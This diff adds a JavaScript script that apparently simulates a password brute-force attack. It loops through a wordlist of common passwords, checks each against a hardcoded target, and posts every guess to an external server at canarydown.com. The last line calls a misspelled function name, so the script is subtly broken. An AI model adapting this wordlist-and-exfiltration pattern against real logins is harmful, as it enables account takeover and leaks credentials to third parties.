@@ -1,0 +1,95 @@
+(function() {
+    const passwords = [
+        // Common passwords
+        '123456', 'password', '123456789', '12345678', '12345',
+        '1234567', 'qwerty', 'abc123', 'football', '123123',
+        'monkey', 'letmein', 'dragon', 'iloveyou', 'admin',
+        'welcome', 'login', 'princess', 'sunshine', 'password1',
+
+        // Variants and case flips
+        'Password', 'Passw0rd', 'PASSWORD', 'P@ssword', 'P@ssw0rd',
+        'admin123', 'Admin123', 'ADMIN123', 'root', 'root123',
+        'letmein123', 'LetMeIn!', 'letmeinnow', 'letMEin!', 'LetMeIn123',
+
+        // Keyboard patterns
+        '1q2w3e4r', 'qazwsx', 'zxcvbn', 'asdfgh', 'poiuyt',
+        'qwertyuiop', 'mnbvcxz', 'q1w2e3r4', 'zaq12wsx', 'zxc123',
+
+        // Names and years
+        'john2024', 'michael123', 'jessica99', 'admin2022', 'test2023',
+        'charlie1', 'david007', 'jordan23', 'mike1234', 'sarah2021',
+
+        // Default and device passwords
+        'default', 'changeme', 'guest', 'cisco', 'netgear',
+        'adminadmin', 'user', 'test', 'temp1234', '000000',
+
+        // Longer or silly
+        'correcthorsebatterystaple', 'thisisaverysecurepassword', 'hunter2',
+        'letshopeitsnotthis', 'guessme', 'dontguessme', 'notapassword',
+        'itsasecret', 'youwillneverguess', 'impossible',
+
+        // Random mixed strings
+        'x7v9B!z3', 'a1B2c3D4', 'XxCool123xX', 'n0tR34l!', 'weird$Pass',
+        'H@ckM3IfYouCan', 'ILikePie123', 'MyDogFido99', 'G00dLuck!',
+
+        // Obvious date combos
+        '1990', '2020', '2000', '1234561990', 'july2023', 'march1985',
+
+        // Company + year combos
+        'company2024', 'corp123', 'mybiz2023', 'startup2025', 'team2022',
+
+        // Service-themed
+        'gmail123', 'facebook1', 'netflixpass', 'amazon2024', 'appleid',
+
+        // Filler test data
+        'test1', 'test2', 'test3', 'test4', 'test5', 'test6',
+        'alpha', 'beta', 'gamma', 'delta', 'epsilon',
+
+        // Funny/fake
+        'nopasswordhere', 'open_sesame', 'swordfish', 'cheesecake123',
+        'butterfly42', 'passwordispassword', 'guesswhat', 'nothinghere',
+
+        // Numeric overload
+        '000000', '111111', '222222', '333333', '444444',
+        '555555', '666666', '777777', '888888', '999999',
+
+        // Target match (for success trigger)
+        'secret123'
+    ];
+
+    let index = 0;
+
+    function logAttempt(password, success) {
+        fetch('https://canarydown.com/logger.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ password: password, success: success })
+        })
+        .then(res => res.text())
+        .then(response => console.log(`Server log response: ${response}`))
+        .catch(err => console.error('Error logging attempt:', err));
+    }
+
+    window.bruteForce = function() {
+        if (index >= passwords.length) {
+            console.log('❌ Failed to find password.');
+            return;
+        }
+
+        const guess = passwords[index];
+        console.log(`🔍 Trying: ${guess}`);
+        logAttempt(guess, guess === 'secret123');
+
+        if (guess === 'secret123') {
+            document.body.innerHTML = `<h1>✅ SUCCESS! Password is: ${guess}</h1>`;
+        } else {
+            index++;
+            setTimeout(window.bruteForce, 150); // Slight delay to simulate attempts
+        }
+    };
+})();
+
+
+bruteforce()
